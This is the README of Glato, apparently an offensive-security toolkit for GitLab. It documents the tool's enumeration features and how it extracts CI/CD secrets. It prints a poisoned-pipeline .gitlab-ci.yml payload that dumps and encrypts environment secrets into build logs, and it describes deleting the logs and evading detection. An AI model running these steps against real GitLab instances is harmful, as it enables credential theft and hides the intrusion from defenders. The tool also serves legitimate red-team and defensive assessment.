![Supported Python versions](https://img.shields.io/badge/python-3.7+-blue.svg)

# Glato (GitLab Attack TOolkit) -- BETA VERSION

Glato (pronounced "Gelato"), or GiLab Attack Toolkit, is an enumeration and attack tool that allows both 
blue teamers and offensive security practitioners to identify and exploit 
pipeline vulnerabilities within a GitLab Instance's public and private 
repositories.

Glato is current in Beta. As we continue development and testing, users may encounter bugs or unexpected behavior. Please report any issues through GitHub Issues to help us improve.

## Who is it for?

- Security engineers who want to understand the level of access a compromised
  GitLab PAT could provide an attacker
- Blue teams that want to build detections for GitLab attacks
- Red Teamers (Glato was initially designed by Praetorian's Red Team for use on engagements)
- Security architects who want to understand potential risks present in their GitLab environment

## Features

- Token/Cookie Authentication Analysis: Evaluate permissions and scope of GitLab tokens or session cookies
- Project Enumeration: Discover accessible projects and associated metadata and access levels
- Group Enumeration: Map accessible groups and permission levels
- Branch Protection Analysis: Identify misconfigurations in branch protection rules
- Secret Enumeration: Enumerate and extract secrets from multiple sources, including:
  - Project-level CI/CD variables and secure files
  - Group-level CI/CD variables  
  - Instance-level CI/CD variables
  - Variable interpolation through recursive pipeline YML analysis (when permissions prevent variable retrieval through the GL API)
  - Flags secrets used in downstream pipelined when performing YML analysis
- Runner Enumeration: Comprehensive runner analysis including live runner discovery and workflow tag requirements analysis
- Poisoned Pipeline Execution: Exfiltrate secrets securely through PPE attacks that encrypt all CICD variables in transit
- Throttling: Control API request rate to avoid detection

## Getting Started

### Installation

Glato supports OS X and Linux with at least **Python 3.7**.

In order to install the tool, simply clone the repository and use `pip install`. We 
recommend performing this within a virtual environment.

```bash
git clone https://github.com/praetorian-inc/glato.git
cd glato
python3 -m venv venv
source venv/bin/activate
pip install .
```

#### Docker
You can also build and run glato using a Docker container.

**Building the Docker Image:**

```bash
docker build -t glato .
```

**Running glato with Token Authentication:**

To run glato using a GitLab Personal Access Token (PAT):

```bash
docker run -t -e GL_TOKEN=your_token_here glato -u https://gitlab.yourdomain.com [args]
```

**Running glato with Cookie Authentication:**

If using cookie authentication, you'll need to mount a volume for the cookie configuration:

1. Create a cookies.json file locally:
```json
{
    "azure_access": "login.microsoftonline.com#<cookies>",
    "gitlab_session": "gitlab.example.com#_gitlab_session=value;"
}
```

2. Run glato with the volume mounted:
```bash
docker run -t -v $(pwd)/cookies.json:/app/glato/config/cookies.json glato --cookie-auth [options]
```

**Entering Interactive Mode:**

If you need to enter information interactively (like a token when prompted):

```bash
docker run -it glato [options]
```


#### Dev Branch

We maintain a development branch that contains newer Glato features that are not yet added to main.
There is an increased chance you will run into bugs; however, we still run our integration test
suite on the `dev` branch, so there should not be any _blatant_ bugs.

If you want to use the `dev` branch, just check it out prior to running pip install - that's it!

If you do run into any for your specific use case, by all means open an issue!


### Authentication

After installing the tool, it can be launched by running `glato` or
`praetorian-glato`.

We recommend viewing the parameters for the base tool using `glato -h`.

### Authentication

Glato supports two authentication methods:

1. Personal Access Token (PAT)
   - Required scopes: `api` or `read_api` for enumeration features, `api` for PPE attacks
   - To create a PAT:
     1. Go to GitLab User Settings > [Access Tokens](https://gitlab.com/-/profile/personal_access_tokens)  
     2. Create a token with required scopes
     3. Either:
        - Set as environment variable: `export GL_TOKEN=<token>`
        - Enter when prompted by Glato

2. Session Cookie Authentication
   - Useful when PAT creation is restricted or for testing SSO scenarios
   - Setup steps:
     1. Copy template: `cp glato/templates/cookies.json glato/config/cookies.json`
     2. In your browser, log into GitLab
     3. Open browser dev tools > Application/Storage > Cookies
     4. Find the `_gitlab_session` cookie
     5. Update `gitlab_session` in config:
        ```json
        {
            "gitlab_session": "gitlab.example.com#_gitlab_session=value;"
        }
        ```
     6. For GitLab behind Azure App Proxy:
        - Also copy the Azure AD cookies from `login.microsoftonline.com`
        - Update `azure_access` in config similarly
        - If you are not using GitLab behind an Azure App Proxy, you can ignore this section of the cookies file and leave in the dummy values.

   Use `--cookie-auth` when running Glato to use cookie authentication.

Note: Some features like PPE attacks require a PAT and cannot use cookie authentication.


## Why Release This Tool?

During our Red Ream assessments, CI/CD has been the weak link for many organizations. We wanted to release a tool that allows organizations to assess the impact of developer credential compromise and provide a valuable tool for red-teamers and penetration testers to evaluate the access gained from GitLub PATs compromised during an engagement.

This tool is a natural companion [Gato](https://github.com/praetorian-inc/gato/), the GitHub Attack Toolkit. Together, these tools enable security professional to assess the resiliance of GitHub and GitLab to CI/CD pipeline attacks and credential compromise.

## Documentation

### Glato Usage Scenarios

This page is a living document of real-world examples where glato is useful. At a high level: I have access to`X`, how can I do `Y`?

#### Determining the Reach of a Compromised GitLab PAT
This is where glato is most useful as a tool. Suppose you are conducting a penetration test or red team and identify a personal access token hard-coded in a script.

##### Validate
The first step is to validate the token and check the token scopes & user info: `glato --enumerate-token`

##### Enumerate Project Access
Use `glato --enumerate-projects` to discover all accessible projects and their permission levels. Add `--enumerate-secrets` to also extract CI/CD variables and secure files from projects where you have sufficient access. Add `--throttle <seconds>` to add an `x` second delay in between each API request.

##### Use Glato With Alternate GitLab URL
If you are using Glato with an alternate URL (like for an internal GitLab instance), you can use the `-u` flag. Example: `glato --enumerate-projects -u https://gitlab.yourenterpriseurl.io`

##### Enumerate Group Access  
Use `glato --enumerate-groups` to map accessible groups and permission levels. Add `--enumerate-secrets` to extract group-level CI/CD variables where possible.

##### Enumerate Self-Hosted Runners
Use `--enumerate-runners` with both `--enumerate-projects` and `--enumerate-groups` to discover self-hosted runners and analyze workflow runner requirements. This provides comprehensive runner intelligence including live runner data (where permissions allow) and workflow tag analysis for all accessible projects.

The runner enumeration feature provides:
- **Live Runner Discovery**: Enumerates registered self-hosted runners (requires Maintainer+ access)
- **Workflow Tag Analysis**: Analyzes GitLab CI files to extract runner tag requirements (requires Developer+ access)
- **Pipeline Log Analysis**: Examines recent pipeline logs for actual runner usage patterns
- **Gap Analysis**: Identifies mismatches between required vs available runners
- **Security Assessment**: Maps complete runner attack surface across accessible projects

##### Enumerate Everything
Use `--self-enumeration` to perform comprehensive enumeration of all accessible resources. Add `--enumerate-secrets` to include secret extraction where possible.

#### Exfiltrate Secrets via GitLab API
Use `--enumerate-secrets` with project/group enumeration to extract secrets directly via GitLab's API endpoints where permissions allow.
If you don't have permissions to retrieve CICD variables via the API. but you have Developer access to a project, Glato will perform recursive
workflow analysis to identify environment veriables that may indicate project, group, or instance-level secrets. You can use these results
to identify projects that could be good candidates for secrets exfiltration via a Poisoned Pipeline Attack (PPE).

**Warning: This will automatically extract secrets when privileges allow. Only use this feature if you are comfortable having potentially privileged secrets exposed to your machine.**


#### Enumerate Branch Protections
Glato allows enumerating branch protections for a specific project or all accessible projects, which is useful when identifying paths for low-privileged developers to contribute code directly to a default branch. Use `--check-branch-protections` with project enumeration (`--enumerate-projects`) or `--project-path` to analyze branch protection rules and identify potential misconfigurations.

#### Exfiltrate Secrets via PPE
If direct API access to secrets is restricted, use `--exfil-secrets-via-ppe --project-path <path> --branch <branch_name>` to attempt secret exfiltration via pipeline execution. This requires a GitLab PAT with sufficient permissions.

##### How Does the PPE Attack Work?
PPE attacks involve repository modifications and sensitive secrets, and can pose a risk to your organization if executed insecurely. These are the steps Glato takes during a PPE attack, along with various security considerations.

1. Glato creates a new branch in the target project using the value passed in through the `--branch` parameter (if the branch does not already exist). It is **strongly** recommended to use a **new** branch for this step to ensure pipelines on actively used branches are not overwritten.

2. Glato creates a new public key, private key pair and stores them locally.

3. Glato pushes a variation of the following `.gitlab-ci.yml` file to the specified project and branch:
```yaml

variables:
  KEY: <public_key_from_step_2>

stages:
  - build

default:
  image: alpine

build_a:
  stage: build
  script:
    - apk add openssl
    - openssl rand -base64 24 | tr -d '\n' > sym.key
    - echo -n '$'; cat sym.key | openssl pkeyutl -encrypt -pubin -inkey <(echo $KEY | base64 -d) | base64 -w 0; echo -n '$'; env | openssl enc -aes-256-cbc -kfile sym.key -pbkdf2 | base64 -w 0; echo '$'

```

This pipeline creates a new symmetric key, and encrypts the symmetric key with the public key generated it step 2. The encrypted key output is printed to the build log. Then, it uses the symmetric key to encrypt the output of `env` and prints the output to the build log. `env` will contain all instance, project, and group-level CICD variables available to this project + branch combination.

4. Glato retrieves the output from the pipeline job execution log

5. Glato decrypts the encrypted symmetric key using the private key stored locally to recover the symmetric key generated during execution.

6. Glato uses the symmetric key to decrypt the encrypted `env` output and prints the contents of the environment variables.

7. Glato deletes the pipeline job execution logs.

8. If Glato created a new branch in step 1, Glato deletes the branch. *Note: If Glato updated the pipeline yml file of a preexisitng branch, it will not automatically restore the yml contents to avoid triggering unecessary pipelines.*



### OpSsec
If you are a Red-Teamer seeking to assess a token's privileges without alerting the organization of your activities, then you should understand OpSec risks associated with certain features.

**Enumeration:** Any project, group, user, or instance-level enumeration will send a series of API requests that scale according to the size of the target environment. These requests could trigger custom alerts based on spikes in API activity. These risks can be partially mitigated using the `--throttle` flag to add a sleep in between each API request.

**Attack:** Executing a PPE will involve creating a new branch on a repository, adding your own code, triggering a pipeline, deleting the branch, and deleting the pipeline execution logs. During this process, there is potential for GitLab users to notice the activity and attribute it as malicious. Exfiltrating CI/CD variables via the GL API does not require repository modificaitons, but may trigger custom detections that have been impleneted around the CI/CD variables API endpoints.


## Bugs

If you believe you have identified a bug within the software, please open an 
issue containing the tool's output, along with the actions you were trying to
conduct.

If you are unsure if the behavior is a bug, use the discussions section instead!


## Contributing

Contributions are welcome! Please [review](https://github.com/praetorian-inc/gato/wiki/Project-Design) our design methodology and coding 
standards before working on a new feature!

Additionally, if you are proposing significant changes to the tool, please open 
an issue [open an issue](https://github.com/praetorian-inc/glato/issues/new) to 
start a conversation about the motivation for the changes.

## Maintainers

Glato was developed by:
- [John Stawinski](https://www.linkedin.com/in/john-stawinski-72ba87191/)
- [Matthew Jackoski](https://www.linkedin.com/in/matthew-jackoski/)
- [Elgin Lee](https://www.linkedin.com/in/elgin-lee/)
- [Mason Davis](https://www.linkedin.com/in/mas0nd/)

## License

Glato is licensed under the [Apache License, Version 2.0](LICENSE).

```
Copyright 2023 Praetorian Security, Inc

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```
